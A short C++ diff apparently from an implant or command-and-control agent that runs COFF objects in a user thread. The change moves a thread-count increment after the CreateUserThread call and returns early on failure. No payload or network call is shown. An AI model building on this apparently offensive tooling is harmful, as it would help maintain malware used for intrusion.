@@ -236,11 +236,13 @@ namespace Memory {
             params->task_id     = Ctx->session.current_taskid;
 
             inject.parameter = params;
-            Ctx->threads++;
 
             if (!CreateUserThread(NtCurrentProcess(), true, (void*) CoffThread, params, nullptr)) {
                 // LOG ERROR
+                return;
             }
+
+            Ctx->threads++;
         }
     }
 }
